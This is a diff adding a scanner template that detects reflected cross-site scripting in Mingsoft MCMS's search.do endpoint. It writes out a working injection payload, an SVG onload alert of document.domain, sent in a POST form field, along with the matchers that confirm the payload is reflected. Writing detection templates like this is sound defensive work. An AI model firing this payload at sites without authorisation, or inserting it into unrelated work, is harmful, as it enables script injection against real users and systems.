@@ -1,0 +1,41 @@
+id: mcms-search-xss
+brief:
+    title: Mingsoft MCMS < 5.3.1 - Cross-Site Scripting
+    by: ritikchaddha
+    level: medium
+    about: A vulnerability classified as problematic has been found in Mingsoft MCMS up to 5.3.1. This affects an unknown part of the file search.do of the component HTTP POST Request Handler.
+    label:
+        - mingsoft
+        - mcms
+        - xss
+        - vuln
+    score: CVSS:6.1
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs:
+        - "on": word
+          has:
+            - mingsoft.net
+          in: body
+    - verb: POST
+      to:
+        - '{{BaseURL}}/mcms/search.do'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: content_title=1"><sVg/Onload=alert`document.domain`></p>
+      signs:
+        - "on": word
+          has:
+            - '><sVg/Onload=alert`document.domain`>'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
